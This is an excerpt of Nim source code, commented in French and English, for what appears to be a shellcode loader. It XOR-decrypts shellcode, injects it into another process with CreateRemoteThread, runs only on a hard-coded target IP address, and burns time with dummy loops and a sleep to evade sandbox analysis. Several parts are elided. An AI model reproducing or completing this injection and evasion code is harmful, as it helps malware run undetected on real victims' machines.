...
proc xorDecryptInMemory(hProcess: HANDLE, rPtr: LPVOID, key: byte) =
    ...
    xorEncrypt(shellcode, key)  # XOR is symmetric
...
# Payload keying pour s'assurer que le shellcode s'execute sur la target machine
# fonction pour obtenir l'adresse ip locale de la machine et bien vérifier que ça correspond à target
proc executeIfTargetIP(): bool =
    let targetIP = "10.0.10.15" # ip cible où shellcode doit s'exécuter
...
# logic bypass so making some random calculations just to buy time during dynamic analysis

proc uselessCalc(): int = 
    var resultat: int
    for i in 1..1000000:
        resultat += i - 100*(i div (i+8)) + ((i*3) mod 54)   # useless calculations et on finit par un petit sleep
    sleep(3000)
    echo "done doing dummy tasks..."
    return resultat                                  # il faut return la valeur et l'assignée dans le main sinon le compilateur peut supprimer/ignorer la boucle
...
proc susInjection(processID: DWORD, key: byte): bool = 
    ...
    let hThread = CreateRemoteThread(hProcess,      # fonction return le handle du thread je suppose
                                    nil,
                                    0,
                                    cast[LPTHREAD_START_ROUTINE](rPtr), 
                                    nil,
                                    CREATE_SUSPENDED,           # create thread but in suspended state
                                    nil)      
...
when isMainModule:
    ...
    # Payload keying: first we check if we are in target env by checking if IP match IP of target system
    echo "Checking IP address..."
    let is_TargetIP = executeIfTargetIP()

    if is_TargetIP == false:
        quit(0)                 # leave program if not matching IP

    # next we can do some logic bypass through useless calculations 
    let dummy = uselessCalc()
    ...
    let is_success = susInjection(processID, key)
